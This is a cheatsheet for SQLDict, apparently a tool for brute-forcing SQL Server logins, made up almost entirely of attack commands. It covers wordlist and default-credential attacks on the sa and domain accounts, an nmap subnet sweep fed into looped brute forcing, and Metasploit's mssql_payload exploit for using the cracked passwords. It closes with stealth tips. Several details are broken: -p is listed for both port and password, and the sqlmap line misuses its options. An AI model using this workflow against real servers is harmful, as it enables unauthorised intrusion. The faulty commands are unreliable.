# SQLDict Cheatsheet

## Quick Reference

### SQL Server Authentication

```bash
# Single user, password list
sqldict -t 192.168.1.100 -u sa -P /usr/share/wordlists/rockyou.txt

# User list, password list
sqldict -t 192.168.1.100 -U usernames.txt -P passwords.txt

# Custom port
sqldict -t 192.168.1.100 -p 2433 -u sa -P passwords.txt
```

### Windows Authentication

```bash
# Single user, password list
sqldict -t 192.168.1.100 -u administrator -P passwords.txt -d CORP

# User list, password list
sqldict -t 192.168.1.100 -U usernames.txt -P passwords.txt -d CORP
```

### Multiple Threads

```bash
sqldict -t 192.168.1.100 -U usernames.txt -P passwords.txt -T 10
```

### Output to File

```bash
sqldict -t 192.168.1.100 -U usernames.txt -P passwords.txt -o results.txt
```

### Verbose Output

```bash
sqldict -t 192.168.1.100 -U usernames.txt -P passwords.txt -v
```

### Multiple Instances

```bash
for host in $(cat sql_hosts.txt); do
    sqldict -t $host -U usernames.txt -P passwords.txt
done
```

### Default Credentials

```bash
# Common SQL Server default credentials
echo "sa:" > default_creds.txt
echo "sa:sa" >> default_creds.txt
echo "sa:password" >> default_creds.txt
echo "sa:Password1" >> default_creds.txt
echo "sa:sql" >> default_creds.txt
echo "sa:sqlpass" >> default_creds.txt
echo "sa:sqlserver" >> default_creds.txt

sqldict -t 192.168.1.100 -U default_users.txt -P default_creds.txt
```

### Discovery and Attack

```bash
# 1. Find SQL Server instances
nmap -p 1433,1434,2433 --open 192.168.1.0/24 -oG - > sql_hosts.txt

# 2. Extract targets
grep "1433/open\|1434/open\|2433/open" sql_hosts.txt | awk '{print $2}' > targets.txt

# 3. Brute force
for host in $(cat targets.txt); do
    sqldict -t $host -U usernames.txt -P passwords.txt
done
```

### Integration with Metasploit

```bash
msfconsole -q -x "use auxiliary/scanner/mssql/mssql_login; set RHOSTS 192.168.1.100; set USERNAME sa; set PASSWORD password123; run"
```

## Command Options

| Option | Description |
|--------|-------------|
| `-t TARGET` | Target SQL Server hostname or IP |
| `-p PORT` | Target port (default: 1433) |
| `-u USERNAME` | Single username |
| `-U FILE` | Username list file |
| `-p PASSWORD` | Single password |
| `-P FILE` | Password list file |
| `-d DOMAIN` | Windows domain name |
| `-T THREADS` | Number of threads (default: 1) |
| `-o OUTPUT` | Output file |
| `-v` | Verbose output |
| `-q` | Quiet mode |
| `-h` | Show help |

## Common Workflows

### Discover and Attack

```bash
# 1. Find SQL Server instances
nmap -p 1433,1434,2433 --open 192.168.1.0/24 -oA nmap_sql

# 2. Extract targets
grep "1433/open\|1434/open\|2433/open" nmap_sql.gnmap | awk '{print $2}' > sql_targets.txt

# 3. Brute force
for host in $(cat sql_targets.txt); do
    sqldict -t $host -U usernames.txt -P passwords.txt
done
```

### Metasploit Integration

```bash
# Use found credentials
msfconsole -q -x "use exploit/windows/mssql/mssql_payload; set RHOSTS 192.168.1.100; set USERNAME sa; set PASSWORD password123; exploit"
```

### SQLMap Integration

```bash
# Use found credentials for SQL injection
sqlmap -h 192.168.1.100 -p 1433 -U sa -P password123 --dbs
```

## Troubleshooting

### Common Errors

**"Connection refused"**:
```bash
nmap -p 1433 192.168.1.100
sqlcmd -S 192.168.1.100 -U sa -P password123
```

**"Login failed"**:
```bash
sqldict -t 192.168.1.100 -u sa -P passwords.txt -v
sqldict -t 192.168.1.100 -u administrator -P passwords.txt -d CORP
```

**"Timeout"**:
```bash
sqldict -t 192.168.1.100 -U usernames.txt -P passwords.txt -T 1
```

## OpSec Tips

1. **Reduce threads**: Use `-T 1` for stealth
2. **Add delay**: Use `sleep 1` between attempts
3. **Log everything**: Use `-o` for audit trail
4. **Use default credentials**: Test common SQL Server defaults

## Resources

- **GitHub**: https://github.com/InfoSecPat/SQLDict
- **Kali Docs**: https://www.kali.org/tools/sqldict/
